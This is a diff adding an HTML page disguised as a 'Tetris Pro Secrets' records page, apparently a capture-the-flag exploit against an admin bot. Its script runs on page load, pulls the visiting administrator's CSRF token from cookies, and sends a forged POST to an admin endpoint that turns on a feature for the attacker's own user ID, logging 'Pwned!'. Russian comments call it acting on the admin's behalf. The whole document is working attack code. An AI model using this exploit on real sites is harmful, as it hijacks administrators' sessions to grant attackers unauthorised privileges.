@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Tetris Pro Secrets</title>
+</head>
+<body>
+    <script>
+        (function() {
+            // 1. Извлекаем CSRF-токен из кук администратора (бот его имеет)
+            const token = document.cookie.split('; ')
+                .find(row => row.startsWith('csrf_token='))
+                .split('=')[1];
+
+            // 2. Твой UUID, который мы нашли
+            const myUserId = "2b3549aa-5e6a-47ef-8f24-a82a5cfe29b3"; 
+
+            // 3. Отправляем запрос от имени админа на включение line_mode
+            const params = new URLSearchParams();
+            params.append('line_mode', '1');
+            params.append('csrf_token', token);
+
+            fetch('/admin/line-mode/user/' + myUserId, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: params.toString()
+            }).then(() => {
+                console.log("Pwned!");
+            });
+        })();
+    </script>
+    <h1>Загрузка рекордов... Пожалуйста, подождите.</h1>
+</body>
+</html>
